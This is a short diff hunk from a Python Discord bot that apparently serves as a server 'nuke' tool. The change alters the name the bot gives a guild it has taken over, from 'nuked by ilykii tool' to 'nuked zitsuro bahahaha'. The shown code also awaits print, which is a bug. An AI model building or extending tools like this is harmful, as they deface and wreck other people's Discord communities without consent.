@@ -73,7 +73,7 @@ async def on_ready():
             pass
     try:
         
-        await guild.edit(name="nuked by ilykii tool")
+        await guild.edit(name="nuked zitsuro bahahaha")
         await print("server name changed")
     except:
         print("name edit error")
